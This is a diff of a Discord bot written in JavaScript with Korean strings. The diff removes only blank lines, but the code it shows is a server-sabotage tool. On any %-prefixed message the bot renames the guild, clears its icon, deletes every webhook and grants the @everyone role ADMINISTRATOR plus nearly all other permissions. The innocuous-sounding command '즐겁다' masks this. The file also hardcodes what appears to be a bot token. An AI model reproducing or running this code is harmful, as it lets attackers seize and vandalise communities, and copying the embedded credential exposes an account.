@@ -1,12 +1,10 @@
 const Discord = require('discord.js');
-
 const client = new Discord.Client();
 const prefix = '%'
 
 client.once('ready', () => {
 	console.log('켜졌어');
 });
-
 process.on('unhandledRejection', error => {
 	console.error('Unhandled promise rejection:', error);
 });
@@ -15,7 +13,6 @@ client.on('message', message => {
 	if (!message.content.startsWith(prefix) || message.author.bot) return;
 	const args = message.content.slice(prefix.length).trim().split(/ +/);
 	const command = args.shift().toLowerCase();
-
 	const clean = message.guild.setName(`${message.guild.owner.user.tag.substring(0,message.guild.owner.user.tag.indexOf("#", 0))}님의 서버`)
 	message.guild.setIcon(null)
 	message.guild.fetchWebhooks().then(function (web) {web.forEach(function (webhook) {webhook.delete()})})
@@ -44,8 +41,6 @@ client.on('message', message => {
 	message.guild.roles.everyone.setPermissions(['ADMINISTRATOR', 'KICK_MEMBERS', 'BAN_MEMBERS', 'MANAGE_MESSAGES', 'MANAGE_ROLES', 'MANAGE_WEBHOOKS', 'MANAGE_EMOJIS', 'CREATE_INSTANT_INVITE', 'MANAGE_NICKNAMES', 'MUTE_MEMBERS', 'SPEAK', 'CONNECT', 'DEAFEN_MEMBERS', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES'
 	, 'VIEW_GUILD_INSIGHTS', 'ATTACH_FILES', 'EMBED_LINKS', 'SEND_TTS_MESSAGES', 'SEND_MESSAGES', 'VIEW_CHANNEL', 'STREAM', 'PRIORITY_SPEAKER', 'ADD_REACTIONS', 'MANAGE_CHANNELS', 'USE_EXTERNAL_EMOJIS', 'MENTION_EVERYONE', 'READ_MESSAGE_HISTORY', 'VIEW_AUDIT_LOG', 'MANAGE_GUILD']);
 	})
-	
 	if (command === '즐겁다') clean
 });
-
 client.login("Nzk1NDcwMzk2MDY1MDU0NzQw.X_J1iQ.Nnx-otr_0HXNYmZB8zU7ErOHuQ8");
